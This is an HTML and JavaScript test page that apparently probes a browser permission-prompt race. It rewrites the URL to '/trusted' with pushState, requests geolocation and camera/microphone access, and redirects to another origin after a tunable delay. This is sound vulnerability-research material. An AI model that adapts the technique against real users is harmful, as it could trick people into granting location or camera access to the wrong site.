<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Permission Test</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>

<body>

<button id="start">
Prepare Test
</button>

<button onclick="requestGeo()">
Test Geolocation
</button>

<button onclick="requestMedia()">
Test Camera/Mic
</button>

<p id="state"></p>
<p id="result"></p>


<script>

const state =
document.getElementById("state");

const result =
document.getElementById("result");


let prepared = false;



function print(msg){

result.innerHTML = msg;

}



function snapshot(label){

state.innerHTML +=
"<br><br>"+label+
"<br>URL: "+location.href+
"<br>Origin: "+location.origin;

}



/*
STEP 1
Change history state
*/

document.getElementById("start")
.onclick = ()=>{


snapshot("Before pushState");


history.pushState(
{
test:true
},
"",
"/trusted"
);


snapshot("After pushState");


prepared=true;


};





/*
GEOLOCATION
*/

function requestGeo(){


if(!prepared){

print("Run Prepare Test first");
return;

}



snapshot(
"Before geolocation request"
);



navigator.geolocation.getCurrentPosition(


(pos)=>{


snapshot(
"Geolocation success"
);


print(
pos.coords.latitude+
"<br>"+
pos.coords.longitude
);


},


(err)=>{


print(
"Geo error: "+err.message
);


}


);


}




/*
CAMERA + MIC
*/

async function requestMedia(){


if(!prepared){

print("Run Prepare Test first");
return;

}



snapshot(
"Before media request"
);



try{


const stream =
await navigator.mediaDevices.getUserMedia({

video:true,

audio:true

});


snapshot(
"Media success"
);


print(
"Camera + Mic granted"
);


stream.getTracks()
.forEach(t=>t.stop());


}

catch(e){

print(
"Media error: "+e.message
);

}


}



/*
RACE WINDOW TEST

ubah nilai delay untuk eksperimen
*/

const DELAY = 80;


window.addEventListener(
"pageshow",
()=>{


requestAnimationFrame(()=>{


requestAnimationFrame(()=>{


setTimeout(()=>{


snapshot(
"Race point reached"
);


// aktifkan hanya untuk reproduksi navigasi
location.href="https://example.com:9090";


}, DELAY);


});


});


});


</script>

</body>
</html>
